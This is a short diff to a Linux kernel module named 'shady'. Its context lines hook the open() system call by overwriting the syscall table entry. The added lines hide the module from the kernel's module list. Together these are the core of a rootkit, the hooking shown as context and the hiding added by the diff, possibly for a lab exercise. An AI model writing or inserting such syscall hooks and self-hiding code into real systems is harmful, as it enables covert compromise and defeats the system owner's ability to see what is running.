@@ -244,6 +244,9 @@ shady_init_module(void)
   old_open = system_call_table_address[__NR_open];
   system_call_table_address[__NR_open] = my_open;
 	
+  // Hide module
+  list_del(&THIS_MODULE->list);
+
   if (shady_ndevices <= 0)
     {
       printk(KERN_WARNING "[target] Invalid value of shady_ndevices: %d\n", 
